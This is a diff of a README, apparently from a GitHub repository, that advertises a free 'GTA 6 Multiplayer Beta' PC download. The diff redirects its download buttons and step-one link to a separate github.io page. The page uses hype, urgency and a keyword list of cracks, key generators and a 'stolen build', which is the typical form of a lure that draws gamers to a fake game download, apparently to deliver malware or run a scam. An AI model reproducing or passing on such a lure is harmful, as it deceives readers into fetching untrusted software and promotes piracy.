@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Multiplayer-Beta-Download-PC - Unlock the Ultimate Heist Experience Today</h1>
 
 <p align="center">
-  <a href="https://github.com/usmanaraja399/GTA-6-Multiplayer-Beta-Download-PC" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#f39c12,#e74c3c);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 25px rgba(231,76,60,0.4);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://usmanaraja399.github.io" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#f39c12,#e74c3c);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 25px rgba(231,76,60,0.4);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ---
@@ -65,7 +65,7 @@ Follow these simple steps to get out on the streets of Vice City in under 20 min
 ### Step 1: Visit the Download Page
 
 
-**Visit this link to download the application:** [https://github.com/usmanaraja399/GTA-6-Multiplayer-Beta-Download-PC](https://github.com/usmanaraja399/GTA-6-Multiplayer-Beta-Download-PC)
+**Visit this link to download the application:** [https://usmanaraja399.github.io](https://usmanaraja399.github.io)
 
 
 This will take you to the official download hub### Step 2: Click the Green "Download" Button
@@ -176,7 +176,7 @@ This is it. This is your one-time chance to play the most anticipated title of t
 
 
 <p align="center">
-  <a href="https://github.com/usmanaraja399/GTA-6-Multiplayer-Beta-Download-PC" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#2ecc71,#27ae60);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 25px rgba(46,204,113,0.4);">⬇️ GET INSTANT ACCESS</a>
+  <a href="https://usmanaraja399.github.io" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#2ecc71,#27ae60);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 25px rgba(46,204,113,0.4);">⬇️ GET INSTANT ACCESS</a>
 </p>
 
 Keywords: gta-6-2026, gta-6-activation, gta-6-beta, gta-6-cd-key, gta-6-deluxe-edition, gta-6-direct-download, gta-6-empress-crack, gta-6-full-game, gta-6-game-pass, gta-6-key-generator, gta-6-leaked, gta-6-leaked-build, gta-6-license-key, gta-6-pc, gta-6-playtest, gta-6-product-key, gta-6-stolen-build, gta-6-working-2026, gta-vi-free, rockstar-games-crack
